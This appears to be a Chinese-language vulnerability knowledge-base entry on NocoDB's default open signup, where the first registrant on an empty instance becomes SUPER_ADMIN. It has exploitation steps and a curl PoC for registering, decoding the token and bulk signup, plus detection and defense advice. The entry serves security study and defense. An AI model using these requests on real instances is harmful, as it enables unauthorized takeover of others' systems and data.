---
id: web-generic-auth-nocodb-open-signup-first-user-superadmin
title: NocoDB 默认开放注册：首个注册者获 SUPER_ADMIN，批量注册无有效限流
type: scenario
domain: web
path: web/generic/auth
technique: nocodb-open-signup-first-user-admin
tags:
- nocodb
- signup
- auth
- first-user
- super-admin
- rate-limit
- nodejs
- nestjs
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: NocoDB 2026.07.0（Docker latest，原文测试版本）
verification:
  verified_by: verifier-V66
  verified_at: '2026-11-05T12:34:03+08:00'
  notes: 已对照原文与图01-04核对：4 个 signup 别名、仅挂 PublicApiLimiterGuard 未挂 GlobalGuard、isFirstUser 空库首用户赋 CREATOR,SUPER_ADMIN、默认 invite_only_signup/disableEmailAuth 未设、注册即返 JWT、/auth/user/me 可用、批量 20 次均 200、邮箱验证流程未调用、JWT 10h 有效期，均与原文/图一致。已把‘守卫未正确绑定’改为原文的推测性表述：20 次低于源码默认 60 次/分钟，不能单独证明守卫失效，原文未验证超阈值场景。affected_versions 2026.07.0 为原文测试版本（非影响区间声明），保留；未在本机复现。
url: /docs/web/generic/auth/web-generic-auth-nocodb-open-signup-first-user-superadmin/
draft: false
kb_aliases:
- NocoDB 开放注册
- NocoDB signup 未授权
- 首个用户 SUPER_ADMIN
- isFirstUser 管理员
- NC_DISABLE_SIGNUP
- NocoDB 批量注册
---

## 一句话结论

NocoDB 默认配置下 `/api/v1/auth/user/signup` 等四个别名路径不挂 `GlobalGuard`，任何人可直接注册并拿到 JWT；若实例刚部署且 `nc_users` 为空，第一个注册者会被 `isFirstUser` 逻辑直接赋予 `CREATOR,SUPER_ADMIN`，等于零门槛接管整个实例。

## 原理

- signup 路由只挂 `PublicApiLimiterGuard`，没有挂负责 JWT 校验的 `GlobalGuard`，因此请求直达 `usersService.signup()`，无需邀请码、邮箱验证或 CAPTCHA。
- `registerNewUserIfAllowed` 先执行 `User.isFirst(ncMeta)`：数据库无用户且 `NC_CLOUD !== 'true'` 时，`roles = CREATOR,SUPER_ADMIN`；否则读取 `appSettings.invite_only_signup`，默认 undefined，走 else 赋 `VIEWER`。
- 默认配置下 `invite_only_signup` 未设置、`disableEmailAuth` 未设置，开放注册对所有请求生效；源码中 `// todo : opening up signup for timebeing` 注释说明这是长期未修的临时开放。
- `PublicApiLimiterGuard` 是自实现的内存计数器，源码默认每分钟 60 次；实测连续 20 次注册全部 200 未触发限流（20 次低于 60 次/分钟阈值，不能单独证明守卫失效），原文推测其未正确绑定到路由，未验证超阈值场景。
- 邮箱验证流程未被调用，任意邮箱（含不存在域名）注册后即可用 Token 访问授权接口；`token_version` 机制只防旧 Token 复用，攻击者自己注册的 Token 从创建到过期不会变化。
- JWT 默认有效期 10 小时，给攻击者足够时间侦察和利用。

## 触发条件

- 目标暴露 NocoDB HTTP 端口（默认 8080），且未设置 `NC_DISABLE_SIGNUP=true`。
- 实例处于默认配置（`invite_only_signup` 未开启、`disableEmailAuth` 未开启）。
- 若 `nc_users` 为空（新部署/清库后），首个注册者直接成为 SUPER_ADMIN；否则新用户至少获得 org-level-viewer。

## 利用步骤

1. 访问 `/api/v1/version` 确认 NocoDB 及版本。
2. 向 `/api/v1/auth/user/signup` POST 任意邮箱/口令，获取 JWT。
3. 解码 JWT payload，确认 `roles`；若为 `org-level-viewer` 说明已有用户，若为 `super-admin`/`org-level-creator` 说明抢到首个用户。
4. 用 `xc-auth` 头或 `nc_token` Cookie 访问 `/api/v1/auth/user/me` 验证。
5. 若未抢到管理员，可批量注册（实测 20 次全部 200）用于后续存储型攻击或社工；若抢到管理员，直接操作实例配置、用户与数据。

## PoC

```bash
# 注册并拿 Token
curl -s -X POST http://target:8080/api/v1/auth/user/signup \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com","password":"Attack123!","first_name":"Evil","last_name":"Hacker"}'
# {"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}

# 解码 payload
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
# roles: "org-level-viewer"（已有用户）或 "CREATOR,SUPER_ADMIN"（首个用户）

# 验证
curl -s http://target:8080/api/v1/auth/user/me -H "xc-auth: $TOKEN"

# 批量注册测试（观察是否限流）
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{http_code} " -X POST http://target:8080/api/v1/auth/user/signup \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"bulk${i}@test.com\",\"password\":\"Bulk1234!\",\"first_name\":\"Bulk\",\"last_name\":\"${i}\"}"
done
```

## 变体与关联

- **四个路径别名**：`/auth/user/signup`、`/api/v1/auth/user/signup`、`/api/v2/auth/user/signup`、`/api/v1/db/auth/user/signup` 指向同一方法，防护需覆盖全部。
- **抢首用户**：新部署实例在管理员初始化前暴露公网，攻击者先注册即管理员；清库/重置后同样成立。
- **邮箱枚举**：重复注册返回 `User already exist`，可用于判断邮箱是否已注册。
- **关联**：[[web-generic-auth-unauth-user-create-admin-takeover]]（未授权建号接管）、[[web-nodejs-yapi-project-copy-script-vm-unauth-rce]]（匿名注册作为 RCE 链入口）、[[web-generic-file-upload-nocodb-attachment-unauth-download-idor]]（注册后进入附件链）。

## 检测与防御

- 设置 `NC_DISABLE_SIGNUP=true` 关闭开放注册；需要多用户时启用 `invite_only_signup` 并强制邮箱验证。
- 部署后立即完成管理员初始化，避免空库实例暴露公网；升级/重置后检查 `nc_users` 是否为空。
- 在反向代理/WAF 层对 signup 限流，不依赖应用内 `PublicApiLimiterGuard`。
- 检测：短时间大量 signup、异常邮箱域名注册、首个用户注册来源 IP 异常；监控 `nc_users` 新增与角色为 SUPER_ADMIN 的账户。
